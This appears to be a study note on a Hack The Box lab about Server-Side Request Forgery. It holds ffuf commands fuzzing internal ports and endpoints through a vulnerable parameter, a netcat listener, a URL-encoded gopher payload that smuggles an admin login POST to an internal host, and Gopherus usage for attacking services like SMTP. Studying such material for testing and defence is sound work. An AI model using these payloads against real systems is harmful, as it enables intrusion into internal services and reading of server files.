---
aliases:
  - Server-Side Request Forgery (SSRF)
---
# Server-Side Request Forgery (SSRF)

Furthermore, if the web application relies on a user-supplied URL scheme or protocol, an attacker might be able to cause even further undesired behavior by manipulating the URL scheme. For instance, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

* `http://` and `https://`: These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network
* `file://`: This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI)
* `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases

## 1.Identifying SSRF

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhueUuInmSJiVT3SyI2md%2Fimage.png?alt=media&amp;token=827b091b-04b8-49a0-a98d-b5f103a69182" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FKIraR5g1EBU0Jh5kHfQo%2Fimage.png?alt=media&amp;token=ef51328b-7bc6-40bd-bd85-d0c31e1dc116" alt=""><figcaption></figcaption></figure>

```shell-session
nc -lnvp 8000
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FpdJZ81lp7y2UYF5SewHl%2Fimage.png?alt=media&amp;token=3232c8e0-08ef-4700-9bc7-212767c442f6" alt=""><figcaption></figcaption></figure>

## Enumerating the System

```shell-session
seq 1 10000 > ports.txt
```

```shell-session
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

## 2.Exploiting SSRF

### Accessing Restricted Endpoints

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FP7VrvwxXlbvODuKgE5aU%2Fimage.png?alt=media&amp;token=44b5f014-a584-48a8-9bad-ef58760fcced" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuIJNoP6OxtTobkVBzwGI%2Fimage.png?alt=media&amp;token=93098434-e232-4227-9a04-786af23eefd8" alt=""><figcaption></figcaption></figure>

```shell-session
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### Local File Inclusion (LFI)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1lPh37ttbmiXicvpcwWf%2Fimage.png?alt=media&amp;token=2b79e64b-784b-42fd-9ed3-901b00b94785" alt=""><figcaption></figcaption></figure>

## The gopher Protocol

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FOiCa93ZOVElLChtWv9TG%2Fimage.png?alt=media&amp;token=839447c7-a785-49c3-8c5b-950091324210" alt=""><figcaption></figcaption></figure>

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Ff8DCrVfIcPefyxv9dldQ%2Fimage.png?alt=media&amp;token=14112df2-d44c-4064-ba94-b85472fb3999" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/tarunkant/Gopherus>" %}

```shell-session
python2.7 gopherus.py
python2.7 gopherus.py --exploit smtp
```

Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us. The following services are supported:

* MySQL
* PostgreSQL
* FastCGI
* Redis
* SMTP
* Zabbix
* pymemcache
* rbmemcache
* phpmemcache
* dmpmemcache

## 3.Blind SSRF

### Identifying Blind SSRF

```shell-session
nc -lnvp 8000
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F64Ivdb9e2kmF5BeizfVE%2Fimage.png?alt=media&amp;token=d5911aea-1a85-4e52-af1b-7148d9a53174" alt=""><figcaption></figcaption></figure>

## Exploiting Blind SSRF

Exploiting blind SSRF vulnerabilities is generally severely limited compared to non-blind SSRF vulnerabilities. However, depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports. In this case, the web application responds with `Something went wrong!` for closed ports:

![HTTP POST request to /index.php with date parameter; response indicates an error: 'Something went wrong!'](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_2.png)

However, if a port is open and responds with a valid HTTP response, we get a different error message:

![HTTP POST request to /index.php with date parameter; response indicates date is unavailable.](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_3.png)

Depending on how the web application catches unexpected errors, we might be unable to identify running services that do not respond with valid HTTP responses. For instance, we are unable to identify the running MySQL service using this technique:

![HTTP POST request to /index.php with date parameter; response indicates an error: 'Something went wrong!'](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_4.png)

Furthermore, while we cannot read local files like before, we can use the same technique to identify existing files on the filesystem. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports:

![HTTP POST request to /index.php with date parameter; response indicates date is unavailable.](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_5.png)

For invalid files, the error message is different:

![HTTP POST request to /index.php with date parameter; response indicates an error: 'Something went wrong!'](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_blind_6.png)

\ <br>
